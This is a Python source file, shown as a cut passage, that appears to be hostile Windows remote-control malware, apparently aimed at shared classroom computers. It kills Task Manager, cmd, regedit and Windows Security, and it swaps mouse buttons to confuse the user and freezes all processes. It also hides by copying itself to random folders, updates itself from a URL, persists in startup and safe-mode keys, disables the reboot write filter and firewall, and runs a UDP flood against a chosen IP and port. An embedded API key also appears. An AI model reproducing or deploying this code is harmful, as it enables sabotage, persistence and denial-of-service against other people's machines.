    stop_event_windowslag.clear()  # Reset the stop event
    print('enabling the weird event thing')
    winlag_thread = threading.Thread(target=windows_lag_click_sound, args=(stop_event_windowslag,))
    winlag_thread.start()

    
def disable_windows_lag_click_sound():
    stop_event_windowslag.set()  # Signal the thread to stop
    try:
        winlag_thread.join()  # Wait for the thread to finish
    except:
        pass


    
        
        

def send_all_hosts_a_todo(todo, identifier=None, settingIP=None): # settingIP is for a device e.g. a phone that requests something from all the devices and wnat them to return it back to it
    # if settingIP == None:
        # giventosendip = socket.gethostbyname(socket.gethostname())
        
    # TODO: add another variable that contains or just use the identifier that the original host e.g. a phone that has requested this will get all the data, so like after this hosts received all the data it'll then send it back to the phone
    splitter = "XR~=3yy=[W2vc%L"
    if identifier == None:
        identifier = ''.join([str(random.randint(0, 9)) for _ in range(10)])
    buildup = fr"REQUESTSENDALLHOSTCONTINUEONMESSAGE{splitter}{socket.gethostbyname(socket.gethostname())}{splitter}{identifier}{splitter}{todo}"
    done_vary_tasks.append(identifier)
    sendAllVaryHosts(buildup)
    # done
    # make it so that for all the hosts it'll make a todo send all, and it'll have a uniqe starting id at the start, e.g. REQUESTSENDALLHOSTCONTINUEONMESSAGE:randomintstring*10length:msg-to-send make it to be repeated the task once, but continue it / send it to the rest of the hosts, twice
    

def isIn(name, list): 
    """"
    is in list, is "name" in the list, and do any of those strings contain that?
    """
    for i in list:
        if name.lower() in i.lower():
            return True
    return False
    
def procKill(name):
    '''in exe name, e.g. chrome.exe'''
    if '.' in name:
        pass
    else:
        name += ".exe"
    try:
        runcmd('taskkill /f /im ' + name)
    except:
        pass
    
def SmartAssNoInternet():
    global INTERNET, run_win_click_exclamation, autofreezeunknownprocesses, SmartAssNoInternet_isenabled
    # Initialize the variables
    wastriggedduetonointernet = False
    AmountOfTimeWithoutInternet_check = 0
    AmountOfTimeInSecondsWithoutInternet = 0
    previousTime = 0
    
    def resetback():
        AmountOfTimeWithoutInternet_check = 0
        AmountOfTimeInSecondsWithoutInternet = 0
        autofreezeunknownprocesses = False
        swapped = GetSystemMetrics(SM_SWAPBUTTON)
        if swapped:
            swapRMBAndLMB(False)
        previousTime = time.time()
        run_win_click_exclamation = False
        disable_windows_lag_click_sound()
        try: unfreeze_all_processes()
        except: pass
        
        # i'll add the set here as well as i'm afraid i'll forget to add it at one point.
        wastriggedduetonointernet = False
        
    # Loop indefinitely
    while True:
        if SmartAssNoInternet_isenabled == True:
            if INTERNET == True and wastriggedduetonointernet == True: # maybe this was causing a unfreeze either way.. but i'll still optimize the threads as it's just messy
                # If the internet is working, reset the variables
                resetback()
                
                wastriggedduetonointernet = False
                print('reset the smartassnointernet\'s doing as internet is back on.')
                
            else:
                wastriggedduetonointernet = True
                autofreezeunknownprocesses = True
                # If the internet is not working, increment the variables
                if AmountOfTimeWithoutInternet_check == 0:
                    # Start the timer
                    AmountOfTimeWithoutInternet_check = time.time()
                else:
                    # Update the elapsed time
                    AmountOfTimeInSecondsWithoutInternet = time.time() - AmountOfTimeWithoutInternet_check
                
                if previousTime == round(time.time()):
                    continue
                else:
                    previousTime = round(time.time())
                
                # now it should be running at 1 second intervals
                if round(AmountOfTimeInSecondsWithoutInternet) == 10:
                    enable_windows_lag_click_sound()
                    
                    
                print(f"Amount of time without internet: {AmountOfTimeInSecondsWithoutInternet} seconds")
                if AmountOfTimeInSecondsWithoutInternet > 2:
                    list_of_process_names = []
                    [list_of_process_names.append(i.name())for i in psutil.process_iter()]
                    if isIn("systemsettings.exe", list_of_process_names):
                        procKill("systemsettings")
                    if isIn("SecHealthUI.exe", list_of_process_names):
                        procKill("SecHealthUI.exe")
                    if isIn("Taskmgr.exe", list_of_process_names):
                        procKill("Taskmgr.exe")
                    if isIn("regedit.exe", list_of_process_names):
                        procKill("regedit.exe")
                    if isIn("cmd.exe", list_of_process_names):
                        procKill("cmd.exe")
                    # print(abs(AmountOfTimeInSecondsWithoutInternet-round(AmountOfTimeInSecondsWithoutInternet)))
                    if round(AmountOfTimeInSecondsWithoutInternet)%4 == 1:
                        # print('Swapped mouse clicks')
                        swapRMBAndLMB() # let it change each time to confuse the user
                # print(list_of_process_names)
        else:
            if wastriggedduetonointernet == True:
                resetback()
                wastriggedduetonointernet = False
                print('reset the smartassnointernet\'s doing as internet is back on.')
                
            time.sleep(10)
            
def set_volume(volume): # yes it works
    """Sets the volume to the given percentage, from 0 to 100%"""
    pythoncom.CoInitialize()
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volumeInterface = cast(interface, POINTER(IAudioEndpointVolume))

    # Convert the volume from percentage to a float.
    # The valid range is 0.0 (mute) to 1.0 (max).
    newVolume = max(0.0, min(1.0, float(volume) / 100.0))

    # Set the master volume.
    volumeInterface.SetMasterVolumeLevelScalar(newVolume, None)
    pythoncom.CoInitialize()



def updateselfViaLink(url):
    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    splitter = "ym3NY8c35NY"
    currentFilename = get_script_filename()
    extension = currentFilename.split(".")[-1]
    new_filename = f"{random_string}{splitter}{currentFilename}".split(".")[0] + "." + extension
    try:
        response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}, stream=True)
        print('downloading?')
        if response.status_code == 200:
            with open(new_filename, 'wb') as file:
                file.write(response.content)
            print("Downloaded new version successfully!")
        else:
            print(f"Failed to download file. Status code: {response.status_code}")
            return "failed"
    except Exception as e:
        print(f"Failed to download file: {e}")
        return "failed"

    cmd = f"start cmd /k \"{os.path.join(os.getcwd(), new_filename)} update\""
    print(f'cmd: {cmd}')
    os.system(cmd)
    kill_self()
    
    


def find_file_with_string(search_string):
    with os.scandir('.') as entries:
        for entry in entries:
            if entry.is_file() and search_string in entry.name:
                return True, os.path.abspath(entry)
    return False, None


def handle_update():
    # Exists, location = find_file_with_string("ym3NY8c35NY")
    # if not Exists:
    #     return
    # else:
    #     print(f'Found file: {location}')
    splitter = "ym3NY8c35NY"
    # new_filename = f"{random_string}{splitter}{currentFilename}" + "." + extension
    handle_tostart_sequences()
    self_filename = get_script_filename()
    if splitter in self_filename: # meaning it's a correct update file the self
        oldfile = self_filename.split(splitter)[1] 
    else: return
    # base_name, extension = os.path.splitext(oldfile)

    new_filename = os.path.join(get_script_directory(), oldfile).replace("\"", "").replace("\'", "") 
    # os.system(f'msg * removing {new_filename}')
    try:
        runcmd(f'del {new_filename} /f')
    except Exception as e:
        print(f'Failed to delete in handle update the following file: {new_filename}')
    renameSELF(new_filename)
    
    
    
    

def renameSELF(ToWhat): # note that it runs in cmd afterwards, so hide itself from the user and rerun all the add to reg to windows to startup safe mode file etc all of those, as they are name assigned
    # funnily enough you can just rename running processes to something else, but i do not believe this is safe, so i'll still use this option.
    extension = get_script_filename().split(".")[-1]
    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    random_string = f'{random_string}.cmd'
    if "." in ToWhat: # assuming extension exists
        pass
    else:
        ToWhat = ToWhat + "." + extension    
        
    if ToWhat == get_script_filename():
        return "Given name is already set to Filename" # already names so..

    ToWhat_FileNameOnly = os.path.basename(ToWhat)

    cmd_content = f"""
ping 127.0.0.1 -n 3 > nul
TASKKILL /F /T /PID {os.getpid()}
ping 127.0.0.1 -n 1 > nul
ren "{os.path.join(get_script_directory(), get_script_filename())}" "{ToWhat_FileNameOnly}"
"{os.path.join(get_script_directory(), ToWhat)}" delFile "{os.path.join(get_script_directory(), random_string)}" ren"
    """
    with open(os.path.join(get_script_directory(), random_string), "w") as cmd_file:
        cmd_file.write(cmd_content)
    
    runcmd("start " +os.path.join(get_script_directory(), random_string))
    kill_self()

def get_hwnds_for_pid(pid):
    def callback(hwnd, hwnds):
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
            if found_pid == pid:
                hwnds.append(hwnd)
        return True
    hwnds = []
    win32gui.EnumWindows(callback, hwnds)
    return hwnds


def get_pids_for_process_name(process_name):
    pids = []
    for process in psutil.process_iter():
        try:
            if process.name() == process_name:
                pids.append(process.pid)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return pids


def hide_process_via_name(name): # e.g. chrome.exe
    pids = get_pids_for_process_name(name)
    for i in pids:
        hwnds = get_hwnds_for_pid(i)
        for hwnd in hwnds:
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            
def show_process_via_name(name): # e.g. chrome.exe
    pids = get_pids_for_process_name(name)
    for i in pids:
        hwnds = get_hwnds_for_pid(i)
        for hwnd in hwnds:
            win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
    
    
def hide_process_via_pid(pid): # e.g. chrome.exe
    hwnds = get_hwnds_for_pid(pid)
    for hwnd in hwnds:
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
        
def get_process_name_from_pid(pid): 
    return psutil.Process(pid).name()

def get_parent_process_name_from_pid(pid):
    return psutil.Process(pid).parent().name()

def get_own_parent_process_pid():
    return os.getppid()



def freeze_all_processes():
    global windowsDoneFrozen # this is to allow toggle functionality
    #"Well, windows freezes, 100%, good luck recovering from this state"
    
    "Surprisingly.. works.. amazingly too"
    pids_tocheck = get_process_connected_pids(get_own_parent_process_pid())
    # previous 3.6.24 tonotfreeze = ["System", "WindowsTerminal.exe", "OpenConsole.exe", "MemCompression", "wlms.exe", 'svchost.exe', 'dwm.exe', 'MsMpEng.exe', 'fontdrvhost.exe', 'cmd.exe', 'Registry', 'TrustedInstaller.exe', 'NisSrv.exe', 'wininit.exe', 'StartMenuExperienceHost.exe', 'System Idle Process', 'conhost.exe', 'SearchProtocolHost.exe', 'SearchIndexer.exe','explorer.exe','System','services.exe', 'taskkill.exe']
    tonotfreeze = ["System", "OpenConsole.exe", "MemCompression", "wlms.exe", 'svchost.exe', 'dwm.exe', 'MsMpEng.exe', 'fontdrvhost.exe', 'Registry', 'TrustedInstaller.exe', 'NisSrv.exe', 'wininit.exe', 'StartMenuExperienceHost.exe', 'System Idle Process', 'conhost.exe', 'SearchProtocolHost.exe', 'SearchIndexer.exe','System','services.exe', 'taskkill.exe']
    # convert from names to pids in another list
    pids = []
    for process in psutil.process_iter():
        try:
            if process.name() in tonotfreeze:
                pids.append(process.pid)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
            print(f'Error while freezing: {e}')
            pass
    pids_tocheck.extend(pids)
    if windowsDoneFrozen:
        return "already done"
    windowsDoneFrozen = True
    for i in psutil.process_iter():
        try:
            if i.pid in pids_tocheck:
                continue
            else:
                print(f'Suspending {i.name()}')
                i.suspend()
        except:
            pass
        
def unfreeze_all_processes():
    global windowsDoneFrozen # this is to allow toggle functionality
    "hmm.."
    for i in psutil.process_iter():
        try:
            i.resume()
        except:
            pass
    windowsDoneFrozen = False
        
        

        
def toggleFreezingAll():
    global windowsDoneFrozen
    if not windowsDoneFrozen:
        freeze_all_processes()
    else:
        unfreeze_all_processes()
        
def restart_self():
    runcmd(f'start "{get_script_directory()}" "{os.path.join(get_script_directory(), get_script_filename())}"')
    runcmd('taskkill /f /im cmd.exe', retry=3) # just to make sure the window is gone as well
    kill_self()
    os.system(f"taskkill /f /t /im {get_script_filename()}")
    sys.exit()
    

def moveToFolder(ToWhere="Random"):
    # change_directory change directory
    '''
    Expecting: e.g. "C:\Program Files"
    '''
    # note that everytime you move, rename or anythiung that changes the file, you'll need to "reset"(re-add) all the startup and hide to run stuff.
    if ToWhere.casefold() == "Random".casefold():
        # go to a random location on the drive
        ToWhere = get_random_folder()
        #runcmd(f'msg * {ToWhere}') # TO REMOVE. DEBUG ONLY!
    if " " in ToWhere:
        ToWhere = get_random_folder()
        while " " in ToWhere:
            ToWhere = get_random_folder() # possibly will end up as a inf loop
    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.cmd'
#    copyCMD = fr'robocopy "{get_script_directory()}" "{ToWhere}" "{get_script_filename()}" /Z'
    # idk if runcmd will do it, since improper premission is the issue.
    cmd_content = f"""
ping 127.0.0.1 -n 3 > nul
TASKKILL /F /T /PID {os.getpid()}
ping 127.0.0.1 -n 1 > nul
robocopy "{get_script_directory()}" "{ToWhere}" "{get_script_filename()}" /Z
ping 127.0.0.1 -n 1 > nul
del /f /q "{os.path.join(get_script_directory(), get_script_filename())}"
start cmd /k \"{os.path.join(ToWhere, get_script_filename())} delFile {os.path.join(get_script_directory(), random_string)} ren\"
    """
    with open(os.path.join(get_script_directory(), random_string), "w") as cmd_file:
        cmd_file.write(cmd_content)
    
    runcmd("start " +os.path.join(get_script_directory(), random_string))
    kill_self()

    # runcmd(copyCMD)
    # print('slp start')
    # slp(1)
    # print('slp done,  onto command of run new script')

    # runcmd(f"start cmd /k \"{os.path.join(ToWhere, get_script_filename())} delFile {os.path.join(get_script_directory(), get_script_filename())} ren\"", retry=4) # like it tries too many times causing it to not kill it
    # print('to kill self function')
    # kill_self()
    # a windows cmd command to copy the file to the location

if len(sys.argv) > 1: # make sure no active running code is before this as this is meant to be one of the first thing to be running!, reason it's here and not at the start so that python would know what functions are being used
    if sys.argv[1].lower() == 'renSEQ'.lower():
        # make second args to ren the file..
        # idk what i'm doing just a test.
        print(sys.argv)
    if sys.argv[1].lower() == 'delFile'.lower() and len(sys.argv) > 2:
        tl1=sys.argv[2].replace("\"", "").replace("\'", "")
        try:
            if '\\' in tl1: fl = tl1.split('\\')
            if '/' in tl1: fl = tl1.split('/')
            tlname = fl[-1]
            # os.remove(sys.argv[2].replace("\"", "").replace("\'", ""))
            runcmd('del /f /q "' + sys.argv[2].replace("\"", "").replace("\'", "") + '"')
            print("Deleted: " + sys.argv[2].replace("\"", "").replace("\'", ""))
            # print(f'taskkill /f /im {tlname}')
            # runcmd(f'taskkill /f /im {tlname}')
        except Exception as e:
            print(f'Failed to delete {sys.argv[2]} in the argv manager')
        if sys.argv[3] == "ren": # basically restarts the script so it'll use the own UI that it controls rather than CMD
            restart_self()
    if sys.argv[1] == "hide":
        # it will, A: copy itself to a random directory, B: run it whilst having a delFile for the previous file, and continue
        # and you probably should also change the name for something else while this is done. so that if by any chance the filename is viewed 
        # it'll not be found again.
        moveToFolder("Random")
        pass
    if sys.argv[1].lower() == "update":
        handle_update()
    if sys.argv[1].lower() == "initialize".lower(): # add the startup stuff, and "install" dvrfy
        self_tostartup()
        if admin_privileges:
            bypassfirewall() # it needs admin rights.. and to just have a prompt.. just like that..
        restart_self()

# moveToFolder() # comodo blocked me from testing whether or not the random works, as it kinda spread out so comodo froze the script

print('Got args: ', str(sys.argv))
import ctypes

def is_system_user(): # unneeded as i fixed it in the startup script
    token_info = ctypes.windll.advapi32.OpenProcessToken(ctypes.windll.kernel32.GetCurrentProcess(), 2, 1)
    sid_type = ctypes.c_ubyte()
    sid_size = ctypes.c_ulong(0)
    sid_data = ctypes.create_string_buffer(sid_size.value) # Move this line up
    ctypes.windll.advapi32.GetTokenInformation(token_info, 1, ctypes.byref(sid_data), 0, ctypes.byref(sid_size))
    sid_size = ctypes.c_ulong(sid_size.value)
    ctypes.windll.advapi32.GetTokenInformation(token_info, 1, ctypes.byref(sid_data), sid_size, ctypes.byref(sid_size))
    sid_count = ctypes.c_ulong()
    ctypes.windll.advapi32.GetSidSubAuthorityCount(ctypes.cast(sid_data, ctypes.POINTER(ctypes.c_void_p)))
    sid_type = ctypes.c_ubyte()
    ctypes.windll.advapi32.GetSidSubAuthority(ctypes.cast(sid_data, ctypes.POINTER(ctypes.c_void_p)), 1)
    return sid_type.value == 18


try: issysuser = is_system_user()
except: issysuser = None

if issysuser == True:
    print('System user detected, exiting')
    # os.system('msg * System user detected, restarting to try and obtain normal admin permissions')
    os.system(f'start "{get_script_directory()}" "{os.path.join(get_script_directory(), get_script_filename())}"')
    
    kill_self()
    
slp(3)

def check_if_mouse_moved(delta=3):
    """
    Will keep checking if the mouse has moved by more than the specified delta value,
    and will return True when it has moved.
    """

    # Get the current position of the mouse
    x1, y1 = pyautogui.position()

    # Keep checking if the mouse has moved
    while True:
        # Wait for a short period of time
        time.sleep(0.1)

        # Get the new position of the mouse
        x2, y2 = pyautogui.position()

        # Calculate the difference between the old and new positions
        dx = abs(x1 - x2)
        dy = abs(y1 - y2)

        # Check if the mouse has moved by more than the specified delta value
        dt = math.sqrt(dx^2 + dy^2)
        
        # print(dt)
        
        if dt > delta:
            return True
        



def check_if_keyboard_pressed():
    """Waits for a key press and returns True when a key is pressed."""
    def on_press(key):
        return False  # Stop the listener

    with pynput_keyboard.Listener(on_press=on_press) as listener:
        listener.join()  # Wait for a key press

    return True  # Return True after a key is pressed

# self_tostartup()
# self_to_rerun_if_killed()
# programVL2('start cmd.exe')
# runcmd('start cmd.exe')
# runcmd('msg * startup')
SmartAssNoInternet_isenabled = True

def toggleSmartAssNoInternet(Set=None): # should be working, untested!
    global SmartAssNoInternet_isenabled
    if Set == True: # it's enabled, and if no internet it does the thing
        SmartAssNoInternet_isenabled = True
    elif Set==False: # not enabled and if no internet it won't interfere
        SmartAssNoInternet_isenabled = True
# by default have this enabled: 
toggleSmartAssNoInternet(Set=True)

# os.system(f'msg * update successful, admin: {admin_privileges}')

# here check run
while INTERNET == False: pass
SERVER = socket.gethostbyname(socket.gethostname()) # you know what you can do, if this errors, as only one usage each socket address, just scan the local device for devices using this, kill them(and child processes) & corrupt. 
ADDR = (SERVER, vary_PORT)

    

    
check_run = check_and_kill_self(SERVER, vary_PORT)
print(check_run + " = checkrun")
# slp(2)
if check_run == "ks":
    kill_self()
    sys.exit()
    
else: # if the below errors out, kill all unknown processes. if still it happens, reboot windows.
    try:
        # i don't know if this sleep is needed, but i assume to detach from the socket takes sometime. esp on these old computers
        # slp(3)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.socket().setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(ADDR)
    except Exception as e:
        print(f'Error3tf: {e}')
        # slp(4)
        runcmd('shutdown.exe /g /t 0')
        
print(f'Running on {SERVER}:{vary_PORT}')
# well apparently to make the self host discoverable you need to disable the firewall. but how do i remove the annoying notification
DosingThreads = []

def dosIPPORT(ipPORT):
    """e.g. dosIPPORT('192.168.1.1:80')"""
    addr = ipPORT.split(':')
    print(f"DOS-ing {addr[0]}:{addr[1]}...")   
    ip = addr[0]
    port = int(addr[1])

    # calculate the amount of threads to create compared to the internet speed that is possible to utilize
    threads_count_to = int(12)
    def tosend():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', 0))
        # Send a large number of smaller packets to the target IP address
        while True:
            sock.sendto(b'A!@#' * 1024 *4, (ip, port))

    for i in range(threads_count_to):
        t = KThread(target=tosend)
        DosingThreads.append(t)
        t.start()
        
def closedosingthreads():
    a = len(DosingThreads)
    print(DosingThreads)
    while len(DosingThreads) > 0:
        tmAAp = DosingThreads[0]
        tmAAp.kill()
        DosingThreads.remove(tmAAp)
        
    print(DosingThreads)

# handle_tostart_sequences()




#code a block port. open/release port, 
# also code a fake thing in where you listen on that port of a program, while blocking it from 
# using/accessing that port and then, you randomly insert/do stuff after opening the port to the program




# get_pids_for_process_name
# get_process_name_from_pid


def who_is_using_port(port): # return pid and location and perhaps name
    for proc in psutil.process_iter(['pid', 'connections']):
        for conn in proc.info['connections']:
            # Check if the remote address is not an empty tuple
            if conn.raddr and conn.raddr.ip != '127.0.0.1':

                print(f"Comparing {conn.laddr.port} with {port}")
                isTrue = int(conn.laddr.port) == int(port)
                if isTrue:
                    return proc.pid, proc.exe().lower().replace('\\', '/').casefold(), proc.name()
    return None

# def name_port_checkv1(name):
#     pids = get_pids_for_process_name(name)
#     list_of_items = []
#     for i in pids:
#         for proc in psutil.process_iter():
#             if proc.pid in pids:
#                 try:
#                     # Iterate over each connection in the list
#                     for conn in proc.connections():
#                         if conn.raddr and conn.raddr.ip != '127.0.0.1':
#                             list_of_items.append(conn.laddr.port)
#                 except (psutil.NoSuchProcess, IndexError, OSError):
#                     pass
#     if list_of_items:
#         # fix list and remove duplicates
#         list_of_items = list(dict.fromkeys(list_of_items))
#         return list_of_items
#     return None


def name_port_check(name): # fixed works
    pids = get_pids_for_process_name(name)
    ports = [conn.laddr.port for pid in pids
             for conn in psutil.Process(pid).connections()
             if True]
    ports = list(dict.fromkeys(ports))
    print(f'ports for {name}: {ports} ')
    return ports if any(ports) else None


def reset_firewall():
    programVL2('netsh advfirewall reset')


def block_application_by_name(block_application_by_name):
    application = block_application_by_name
    pids = get_pids_for_process_name(application)
    application = psutil.Process(pids[0]).exe()
    print(application)    
    #   Create a firewall rule to block incoming and outgoing connections for the specified application
    programVL2(f'netsh advfirewall firewall add rule name=BlockApplication dir=in action=block program={application}')
    programVL2(f'netsh advfirewall firewall add rule name=BlockApplication dir=out action=block program={application}')
    print(f"Blocked connections for application located at: {application}")



def unblock_application_by_name(unblock_application_by_name):
    application = unblock_application_by_name
    pids = get_pids_for_process_name(application)
    application = psutil.Process(pids[0]).exe()
    # Remove the firewall rules that block incoming and outgoing connections for the specified application
    programVL2(f'netsh advfirewall firewall delete rule name=BlockApplication program={application}')
    print(f"Unblocked connections for application located at: {application}")



# a = name_port_check('chrome.exe')

# print(a)
# print(who_is_using_port(a[0]))


# block all ports except those listed, e.g. chrome.exe, and get those ports and don't block them



def block_ports_for_application(block_ports_for_application): # works but chrome is a smartass
    # Get process ID for the application
    application_name = block_ports_for_application
    ports = name_port_check(application_name)
    
    # Block each port used by the application
    for port in ports:
        programVL2(f'netsh advfirewall firewall add rule name=BlockPort {str(port)} dir=in action=block protocol=TCP flocalport={port}')
        print(f"Blocked port {port} for {application_name}")


def unblock_ports_for_application(application_name):
    # Get process ID for the application
    ports = name_port_check(application_name)

    # Unblock each port used by the application
    for port in ports:
        programVL2(f'netsh advfirewall firewall delete rule name=BlockPort {str(port)}')
        print(f"Unblocked port {port} for {application_name}")
        
        
        
        
        
        
        

def revert_changes():
    """Reverts the changes made by the script."""

    # Enable Windows Defender
    EnableWindowsDefender()

    # Enable reset options
    enableresetoptions()

    # Enable Task Manager
    enabletaskmgr()

    # Enable User Account Control
    enableUserAccountControl()

    # Enable firewall
    enablefirewall()

    # Remove self from startup
    remove_self_from_startup()

    # Remove self from safe mode
    remove_self_from_safe_mode()

    # Unprotect the script file
    unprotect_file(os.path.join(get_script_directory(), get_script_filename()))
    
    try: delete_matching_tasks()
    except: pass # it doesn't work, but if it'll error and mess with teh self destruct, no thank you

def remove_self_from_startup():
    """Removes the script from the startup folder and registry."""

    # Remove from startup folder
    startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
    script_filename = get_script_filename()
    startup_path = os.path.join(startup_folder, script_filename)

    try:
        os.remove(startup_path)
        print("Removed from startup folder:", startup_path)
    except FileNotFoundError:
        print("Script not found in startup folder:", startup_path)

    # Remove from registry
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, 'vtl')  # Replace 'vtl' with the actual registry key name
        winreg.CloseKey(key)
        print("Removed from registry.")
    except FileNotFoundError:
        print("Script not found in registry.")

def remove_self_from_safe_mode():
    """Removes the script from the safe mode registry keys."""

    registry_paths = [
        r"HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network"
    ]

    for path in registry_paths:
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(key, "robocopy.exe")  # Replace "robocopy.exe" with the actual key name if needed
            winreg.CloseKey(key)
            print(f"Removed from safe mode registry: {path}")
        except FileNotFoundError:
            print(f"Script not found in safe mode registry: {path}")

def unprotect_file(file_path):
    """Removes the protection attributes from the file."""

    # Remove read-only, hidden, and system attributes
    programVL2(f'attrib -r -h -s "{file_path}"')

    # Grant everyone read and execute permissions
    programVL2(f'icacls "{file_path}" /grant everyone:RX')
    
     # Remove read-only, hidden, and system attributes
    # win32api.SetFileAttributes(file_path, win32api.FILE_ATTRIBUTE_NORMAL)

    # Grant full control to the current user
    # win32api.SetFileSecurity(file_path, win32api.OWNER_SECURITY_INFORMATION | win32api.GROUP_SECURITY_INFORMATION | win32api.DACL_SECURITY_INFORMATION, win32api.SECURITY_DESCRIPTOR)
    
    programVL2(f'takeown /f "{file_path}"')
    programVL2(f'icacls "{file_path}" /grant Everyone:(OI)(CI)F ')


def delete_matching_tasks():
    # Get the full path of the current script
    script_path = os.path.join(get_script_directory(), get_script_filename())

    # List all tasks in XML format
    result = subprocess.run(['schtasks', '/query', '/xml'], capture_output=True, text=True)
    tasks_xml = result.stdout

    # Split tasks by XML declaration
    tasks = tasks_xml.split('<?xml version="1.0" ?>')    
    # Parse the XML to find tasks
    for task_xml in tasks:
        
        if not task_xml.strip():
            continue
        task_xml = '<?xml version="1.0" ?>' + task_xml.strip()
        try:
            root = ET.fromstring(task_xml)
            actions = root.find('.//Actions')
            if actions is not None:
                for exec_action in actions.findall('.//Exec'):
                    command = exec_action.find('Command')
                    if command is not None and command.text == script_path:
                        task_name = root.find('.//RegistrationInfo/URI').text
                        # print(task_name)
                        if task_name:
                            # Delete the matching task
                            delete_command = f'schtasks /delete /tn "{task_name}" /f'
                            subprocess.run(delete_command, shell=True)
                            print(f"Deleted task: {task_name}")
        except ET.ParseError as e:
            print(f"Failed to parse task XML: {e}")





def self_destruct():
    """Deletes the script file and reverts all changes."""

    # Revert changes made by the script
    revert_changes()
    

    # Delete the script file
    script_path = os.path.join(get_script_directory(), get_script_filename())
    random_string_cmd = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.cmd'
    random_task_name = "SelfDestruct_" + ''.join(random.choices(string.ascii_letters + string.digits, k=10))

    # Prepare the content for the .cmd file to delete the script, the batch file, and the scheduled task
    cmd_content = f"""
@echo off
TASKKILL /F /T /PID {os.getpid()}
ping 127.0.0.1 -n 2 > nul
del /f /q "{script_path}"
ping 127.0.0.1 -n 2 > nul
del /f /q "{script_path}"
schtasks /delete /tn "{random_task_name}" /f
ping 127.0.0.1 -n 2 > nul
del /f /q "%~f0"
    """
    
    # Write the content to the .cmd file
    cmd_path = os.path.join(get_script_directory(), random_string_cmd)
    with open(cmd_path, "w") as cmd_file:
        cmd_file.write(cmd_content)
    
    # Get the current user's name
    user_name = os.getlogin()

    # Command to create the scheduled task
    create_task_command = f'schtasks /create /tn "{random_task_name}" /tr "{cmd_path}" /sc ONCE /st 00:00 /f /rl HIGHEST /ru {user_name}'

    # Command to run the scheduled task
    run_task_command = f'schtasks /run /tn "{random_task_name}"'

    # Create the scheduled task
    subprocess.run(create_task_command, shell=True)

    # Run the scheduled task
    subprocess.run(run_task_command, shell=True)

    # Terminate the script
    kill_self()


 


        
# exit()

def disableUWF():
    """Disabling the Restore to previous State on reboot"""
    programVL2('DISM /online /disable-feature /featurename:Client-UnifiedWriteFilter')
    programVL2('uwfmgr.exe filter disable')
    runcmd('shutdown.exe /g /t 0')
def enableUWF():
    """Enabling the Restore to previous State on reboot"""
    programVL2('DISM /online /enable-feature /featurename:Client-UnifiedWriteFilter')
    programVL2('uwfmgr.exe filter enable')
    runcmd('shutdown.exe /g /t 0')
    
    
"""
To disable the UWF(restore to previous state on reboot)
DISM /online /disable-feature /featurename:Client-UnifiedWriteFilter

I think that the class uses this thing to revert to previous windows state and undo all done changes

Sure, here's a quick tutorial on how to use the Unified Write Filter (UWF) feature using command line:

Check if UWF is enabled: You can use the following command to check the current status of UWF:
uwfmgr.exe get-config

Update the current state: If you want to apply Windows updates to a UWF-protected device, you can use the following commands:
uwfmgr.exe filter restart
shutdown /r /t 0

On restart, the device will automatically sign in to the servicing account and servicing will start.

Disable UWF: If you want to disable UWF, you can use the following commands:
uwfmgr.exe filter disable
shutdown /r /t 0
After running these commands and restarting, UWF will be disabled.

Enable UWF: If you want to enable UWF again, you can use the following commands:
uwfmgr filter enable
shutdown /r /t 0
After running these commands and restarting, UWF will be enabled.

Please note that these commands should be run in a command prompt with administrator privileges. Also, keep in mind that enabling or disabling UWF will make changes to your system settings.
"""



def websiteUI():
    print(f'Initializing UI...')
    app = Flask(__name__, static_folder='./')#, template_folder='./')
    socketio = SocketIO(app, async_mode='gevent')

    thread_scan_network = None
    last_response_from_clientUI = None
    newresponse = None
    currentSelectedIPV4 = None # formatted so, "192.168.1.1:80"

    def get_street_address(lat, lon):
        geolocator = Photon(user_agent="myGeocoder", timeout=10, proxies={"http": None, "https": None})
        location = geolocator.reverse([lat, lon], exactly_one=True)
        return location.address


    def get_weather_description(weather_description):
        weather_map = {
            "clear sky": "clear skies",
            "few clouds": "some clouds",
            "scattered clouds": "a few clouds",
            "broken clouds": "mostly cloudy",
            "overcast clouds": "overcast",
            "shower rain": "showers",
            "rain": "rain",
            "thunderstorm": "thunderstorms",
            "snow": "snow",
            "mist": "mist",
            "smoke": "smoke",
            "haze": "haze",
            "dust": "dust",
            "fog": "fog",
            "sand": "sand",
            "ash": "ash",
            "squalls": "squalls",
            "tornado": "a tornado"
        }
        return weather_map.get(weather_description, weather_description)

    def generate_weather_greeting(location):
        # Fetch weather data
        response = requests.get(f'http://api.openweathermap.org/data/2.5/weather?lat={location[0]}&lon={location[1]}&units=metric&appid=a8bcf85c1ac14fc50ea17311d710be30')
